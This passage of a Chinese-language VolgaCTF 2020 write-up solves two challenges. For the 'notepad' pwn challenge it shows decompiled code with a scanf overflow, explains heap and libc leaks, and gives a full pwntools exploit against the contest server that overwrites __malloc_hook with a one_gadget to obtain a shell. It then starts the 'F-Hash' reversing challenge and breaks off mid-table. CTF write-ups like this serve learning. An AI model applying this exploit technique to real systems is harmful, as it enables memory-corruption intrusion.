<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add notebook</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1442</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( notebook_count == <span class="number">16</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You've reached the limit for notebooks! Delete some of the older once first!"</span>);</span><br><span class="line">    v1 = notebook_count++;</span><br><span class="line">    v2 = (<span class="keyword">char</span> *)&amp;notebooks + <span class="number">2072</span> * v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter notebook name: "</span>);</span><br><span class="line">    <span class="keyword">return</span> __isoc99_scanf(<span class="string">"%s"</span>, v2); <span class="comment">// no limit, overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此可以覆盖<code>notebook.tab_count</code>，而且程序在<code>add tab</code>的操作中限制tabs个数的逻辑为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">16</span>) == <span class="number">64L</span>L )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've reached the limit of tabs! Delete some of the older tabs to add a new one!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以只要覆盖<code>notebook_1.tab_count</code>为65，就可以往下一个notebook写data，而对应的，就能将notebook_2中的<code>tab_2.name</code>覆盖为<code>malloc</code>申请的<code>table_66.content_addr</code>，也就是堆地址。<br><br>那么只要事先添加notebook_2，并同样地覆盖<code>notebook_2.tab_count</code>为2，再进行<code>list tabs</code>操作，就可以从<code>tab_2.name</code>中获得heap address。</p>
<h2 id="leak-libc-address"><a href="#leak-libc-address" class="headerlink" title="# leak libc address"></a># leak libc address</h2><p>事先free出一个unsorted bin，因为heap address已经leak出来了，故unsorted bin的地址可以计算得到。<br><br>同样利用notebook name的溢出，覆盖下一个notebook的tab域，伪造出相应的content_addr(unsorted bin address)，然后利用操作<code>view tab</code>来leak出main_arena的地址，这样就完成了leak libc address<br><br>（测试的时候，因为本地是ubuntu 18.04，正好远程和本地的libc版本一致。）</p>
<h2 id="write-malloc-hook"><a href="#write-malloc-hook" class="headerlink" title="# write __malloc_hook"></a># write __malloc_hook</h2><p>同样伪造下一个notebook的tab域中的content_size和content_addr(__malloc_hook address)，然后利用操作<code>update tab</code>写入one_gadget就行了。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pwn_remote = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pwn_remote:</span><br><span class="line">    p = remote(<span class="string">"notepad.q.2020.volgactf.ru"</span>, <span class="number">45678</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./notepad"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">"1"</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"a"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter notebook name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pick_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"p"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter index of a notebook to pick: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_tab</span><span class="params">(name, length, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"a"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter tab name: "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter data length (in bytes): "</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">"Enter the data: "</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_tab</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"d"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter index of tab to delete: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_tab</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"l"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"["</span> + str(index) + <span class="string">"] "</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_tab</span><span class="params">(index, name, length, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"u"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter index of tab to update: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter new tab name (leave empty to skip): "</span>, str(name))</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter new data length (leave empty to keep the same): "</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">"Enter the data: "</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_tab</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"v"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Enter index of a tab to view: "</span>, str(index))</span><br><span class="line">    <span class="keyword">return</span> p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit_from_tabs</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"q"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebca0</span></span><br><span class="line">realloc_offset = <span class="number">0x40c7e0</span></span><br><span class="line">malloc_hook_offset = <span class="number">0x3ebc30</span></span><br><span class="line">one_gadget_offset = <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># operate note 1</span></span><br><span class="line">add_note(<span class="string">"AAAA"</span>)</span><br><span class="line">pick_note(<span class="number">1</span>)</span><br><span class="line">add_tab(<span class="string">"BBBB"</span>, <span class="number">0x500</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">add_tab(<span class="string">"CCCC"</span>, <span class="number">0x30</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">del_tab(<span class="number">1</span>)</span><br><span class="line">quit_from_tabs()</span><br><span class="line"></span><br><span class="line"><span class="comment"># operate note 2</span></span><br><span class="line">add_note(<span class="string">"D"</span> * <span class="number">0x10</span> + p64(<span class="number">65</span>))</span><br><span class="line">pick_note(<span class="number">2</span>)</span><br><span class="line">add_tab(<span class="string">"DDDD"</span>, <span class="number">0x20</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">quit_from_tabs()</span><br><span class="line"></span><br><span class="line"><span class="comment"># operate note 3</span></span><br><span class="line">add_note(<span class="string">"E"</span> * <span class="number">0x10</span> + p64(<span class="number">2</span>))</span><br><span class="line">pick_note(<span class="number">3</span>)</span><br><span class="line">heap_addr = u64(list_tab(<span class="number">2</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">unsorted_bin_addr = heap_addr + <span class="number">0x30</span></span><br><span class="line">quit_from_tabs()</span><br><span class="line"></span><br><span class="line"><span class="comment"># operate note 4</span></span><br><span class="line">add_note(<span class="string">"F"</span> * <span class="number">0x10</span> + p64(<span class="number">1</span>) + <span class="string">"F"</span> * <span class="number">0x10</span> + p64(<span class="number">8</span>) + p64(unsorted_bin_addr))</span><br><span class="line">pick_note(<span class="number">4</span>)</span><br><span class="line">main_arena = u64(view_tab(<span class="number">1</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">quit_from_tabs()</span><br><span class="line"></span><br><span class="line"><span class="comment"># operate note 5</span></span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">malloc_hook = libc_base + malloc_hook_offset</span><br><span class="line">add_note(<span class="string">"G"</span> * <span class="number">0x10</span> + p64(<span class="number">1</span>) + <span class="string">"G"</span> * <span class="number">0x10</span> + p64(<span class="number">0x10</span>) + p64(malloc_hook))</span><br><span class="line">pick_note(<span class="number">5</span>)</span><br><span class="line">update_tab(<span class="number">1</span>, <span class="string">"G"</span> * <span class="number">0x10</span>, <span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger malloc_hook</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"a"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Enter tab name: "</span>, <span class="string">"shell"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Enter data length (in bytes): "</span>, str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_addr: "</span> + hex(heap_addr))</span><br><span class="line">success(<span class="string">"unsorted_bin_addr: "</span> + hex(unsorted_bin_addr))</span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><code>VolgaCTF{i5_g1ibc_mall0c_irr3p@rable?}</code></p>
<h1 id="F-Hash-250pts"><a href="#F-Hash-250pts" class="headerlink" title="F-Hash: 250pts"></a>F-Hash: 250pts</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>普通ELF文件，直接跑没有回显，程序里存在递归函数，深度是0x100，直接跑是跑不出结果的，不过跑完就能出flag。</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>IDA动态调试，直接run起来，然后暂停，找到递归函数的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_int64 *__<span class="function">fastcall <span class="title">sub_55EE370633B0</span><span class="params">(__int64 *a1, <span class="keyword">int</span> a2, __int64 a3, __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v4; <span class="comment">// r14</span></span><br><span class="line">    __int64 v5; <span class="comment">// r12</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v9; <span class="comment">// rax</span></span><br><span class="line">    __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v11; <span class="comment">// r13</span></span><br><span class="line">    __int128 v12; <span class="comment">// ax</span></span><br><span class="line">    __int128 v13; <span class="comment">// ax</span></span><br><span class="line">    __int128 v14; <span class="comment">// cx</span></span><br><span class="line">    __int128 v15; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">    __int64 v16; <span class="comment">// [rsp+10h] [rbp-68h]</span></span><br><span class="line">    __int128 v17; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">    __int64 v18; <span class="comment">// [rsp+30h] [rbp-48h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+48h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">    v4 = a4;</span><br><span class="line">    v5 = a3;</span><br><span class="line">    v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v9 = calc(a3, a4);</span><br><span class="line">        a1[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">        *a1 = v9;</span><br><span class="line">        a1[<span class="number">1</span>] = v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = calc(a3 ^ <span class="number">1</span>, a4);</span><br><span class="line">        a1[<span class="number">2</span>] = <span class="number">1L</span>L;</span><br><span class="line">        *a1 = v6;</span><br><span class="line">        a1[<span class="number">1</span>] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        recursive_func((__int64 *)&amp;v15, a2 - <span class="number">1</span>, a3, a4);</span><br><span class="line">        recursive_func((__int64 *)&amp;v17, a2 - <span class="number">2</span>, v5, v4);</span><br><span class="line">        v11 = v16 + v18;</span><br><span class="line">        *(_QWORD *)&amp;v12 = calc((v16 + v18) ^ v5, v4);</span><br><span class="line">        v13 = v15 + v17 + v12;</span><br><span class="line">        v14 = *(_OWORD *)(table + <span class="number">16L</span>L * a2);</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)&amp;v14 + <span class="number">1</span>) &lt;= *((_QWORD *)&amp;v13 + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)&amp;v14 + <span class="number">1</span>) &gt;= *((_QWORD *)&amp;v13 + <span class="number">1</span>) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            v13 -= v14;</span><br><span class="line">            <span class="keyword">while</span> ( *((_QWORD *)&amp;v14 + <span class="number">1</span>) &lt; *((_QWORD *)&amp;v13 + <span class="number">1</span>) );</span><br><span class="line">            <span class="keyword">if</span> ( *((_QWORD *)&amp;v14 + <span class="number">1</span>) &gt; *((_QWORD *)&amp;v13 + <span class="number">1</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    LABEL_11:</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)v14 &lt; (<span class="keyword">unsigned</span> __int64)v13 );</span><br><span class="line">        &#125;</span><br><span class="line">        *(_OWORD *)a1 = v13;</span><br><span class="line">        a1[<span class="number">2</span>] = v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其最外层调用是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v32 = v20[<span class="number">1</span>];</span><br><span class="line">    v57.m128i_i64[<span class="number">0</span>] = *v20;</span><br><span class="line">    v57.m128i_i64[<span class="number">1</span>] = v32;</span><br><span class="line">    recursive_func(v30, v29, v57.m128i_i64[<span class="number">0</span>], v32);</span><br><span class="line">    v20 += <span class="number">2</span>;</span><br><span class="line">    v27 ^= v72.m128i_i64[<span class="number">0</span>] + v57.m128i_i64[<span class="number">0</span>];</span><br><span class="line">    v28 ^= (*(_OWORD *)&amp;v72 + *(_OWORD *)&amp;v57) &gt;&gt; <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v20 != v31 );</span><br></pre></td></tr></table></figure>
<p>改写这个<code>recursive_func</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">strings = <span class="string">"The quick brown fox jumps over the lazy dog"</span> + <span class="string">"\x80"</span> + <span class="string">"\x00"</span> * <span class="number">0xC</span> + <span class="string">"\x2b"</span> + <span class="string">"\x00"</span> * <span class="number">0x7</span> </span><br><span class="line"></span><br><span class="line">table = [</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000001</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000000B</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000015</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000001F</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000029</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000033</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000003D</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000047</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000051</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000005B</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000065</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000006F</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000079</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000083</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF600000000000000000000000000008D</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF6000000000000000000000000000097</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000A1</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000AB</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span class="number">0xF60000000000000000000000000000B5</span>,</span><br><span class="line">    <span 